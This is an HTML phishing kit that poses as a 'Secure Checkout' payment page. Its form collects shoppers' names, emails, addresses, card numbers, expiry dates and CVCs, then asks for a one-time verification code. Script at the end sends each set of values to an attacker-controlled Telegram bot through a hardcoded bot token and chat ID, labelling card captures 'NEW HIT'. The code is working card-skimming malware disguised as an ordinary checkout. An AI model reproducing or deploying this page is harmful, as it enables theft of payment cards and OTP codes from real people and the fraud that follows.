<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1a1a1a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container { width: 100%; max-width: 400px; position: relative; }

        /* --- Logo & Header (Ù…Ù‚Ø§Ø³Ø§Øª ÙƒØ¨ÙŠØ±Ø© ÙˆØªØ·Ø§Ø¨Ù‚ ÙƒØ§Ù…Ù„) --- */
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            width: 75px; /* Ø§Ù„Ù„ÙˆØ¬Ùˆ ÙƒØ¨ÙŠØ± ÙˆÙˆØ§Ø¶Ø­ */
            height: auto;
            margin-right: 15px;
            display: flex;
            align-items: center;
        }

        .logo-container img {
            width: 100%;
            height: auto;
            object-fit: contain;
        }

        .header-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--text-main);
        }

        h2 { font-size: 18px; font-weight: 600; margin: 30px 0 15px 0; }
        label { display: block; font-size: 15px; font-weight: 500; margin-bottom: 8px; }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 12px;
        }

        /* --- Grouping Style --- */
        .input-group { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
        .input-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
        .input-group input:last-child { border-bottom: none; }
        .row { display: flex; }
        .row input:first-child { border-right: 1px solid var(--border-color); }

        /* --- Payment Box --- */
        .payment-box { border: 1px solid var(--border-color); border-radius: 10px; padding: 18px; margin-top: 10px; }
        .payment-header { display: flex; align-items: center; margin-bottom: 18px; font-weight: 600; }
        .card-icons { margin-left: auto; height: 30px; } /* Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª ÙƒØ¨ÙŠØ±Ø© */

        .btn-pay {
            width: 100%;
            background: var(--stripe-blue);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            margin-top: 35px;
            cursor: pointer;
        }

        /* --- Custom Internal Alert --- */
        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 999; }
        #customAlert { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: white; border-radius: 14px; z-index: 1000; text-align: center; }
        .alert-content { padding: 30px 20px; font-size: 17px; }
        .alert-btn { width: 100%; padding: 15px; border: none; border-top: 1px solid #eee; background: none; color: var(--stripe-blue); font-size: 18px; font-weight: 700; cursor: pointer; }

        .page { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div id="modalOverlay"></div>
    <div id="customAlert">
        <div class="alert-content">Please fill in all fields correctly.</div>
        <button class="alert-btn" onclick="closeAlert()">Close</button>
    </div>

    <div id="checkoutPage" class="page active">
        <div class="header">
            <div class="logo-container">
                <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
            </div>
            <div class="header-title">Secure Checkout</div>
        </div>

        <h2>Shipping Information</h2>
        <label>Email address</label>
        <input type="email" id="email" placeholder="email@example.com">
        
        <h2>Shipping Address</h2>
        <div class="input-group">
            <input type="text" id="name" placeholder="Full name">
            <input type="text" id="addr" placeholder="Address">
            <div class="row">
                <input type="text" id="city" placeholder="City">
                <input type="text" id="zip" placeholder="Zip code">
            </div>
        </div>

        <h2>Payment Method</h2>
        <div class="payment-box">
            <div class="payment-header">
                <span>ðŸ’³ Card</span>
                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons">
            </div>
            <div class="input-group">
                <input type="text" id="card" placeholder="Card number" maxlength="19">
                <div class="row">
                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
                </div>
            </div>
        </div>

        <button class="btn-pay" onclick="handlePayment()">Pay Now</button>
    </div>

    <div id="otpPage" class="page">
        <h1 style="font-size: 26px;">Verify By Phone</h1>
        <p>Please enter the verification code.</p>
        <input type="text" id="otp" style="height: 65px; text-align: center; font-size: 28px; letter-spacing: 12px;" maxlength="6">
        <button class="btn-pay" onclick="handleOTP()">Confirm</button>
    </div>
</div>

<script>
    const CONFIG = {
        token: '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q', // Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ù‡Ù†Ø§
        chat: '1705240737' // Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ù‡Ù†Ø§
    };

    async function sendTelegram(text) {
        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.chat, text: text, parse_mode: 'HTML'})
        });
    }

    function closeAlert() {
        document.getElementById('customAlert').style.display = 'none';
        document.getElementById('modalOverlay').style.display = 'none';
    }

    document.getElementById('card').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    async function handlePayment() {
        const email = document.getElementById('email').value;
        const card = document.getElementById('card').value;
        const name = document.getElementById('name').value;

        if (!email || card.length < 16 || !name) {
            document.getElementById('customAlert').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
            return;
        }

        const log = `<b>ðŸ”¥ NEW HIT</b>\nðŸ‘¤ Name: ${name}\nðŸ“§ Email: ${email}\nðŸ’³ Card: <code>${card}</code>\nðŸ“… Exp: ${document.getElementById('exp').value}\nðŸ”’ CVC: ${document.getElementById('cvc').value}`;
        await sendTelegram(log);

        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('otpPage').classList.add('active');
    }

    async function handleOTP() {
        const otp = document.getElementById('otp').value;
        if(otp.length === 6) {
            await sendTelegram(`<b>ðŸ”‘ OTP CODE:</b> <code>${otp}</code>`);
            alert("Verification Success.");
        }
    }
</script>
</body>
</html>
